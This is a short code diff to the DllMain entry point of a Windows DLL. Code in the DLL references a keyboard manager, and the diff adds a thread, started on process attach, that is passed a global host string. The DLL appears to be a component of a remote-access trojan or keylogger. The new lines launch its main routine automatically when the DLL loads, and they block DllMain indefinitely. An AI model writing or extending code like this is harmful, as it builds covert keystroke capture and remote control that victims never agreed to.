@@ -215,6 +215,10 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
 		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
 		CKeyboardManager::Initialization();
+		HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
+		//这里等待线程结束
+		WaitForSingleObject(hThread, INFINITE);
+		CloseHandle(hThread);
 		break;
 	}
     case DLL_THREAD_DETACH:
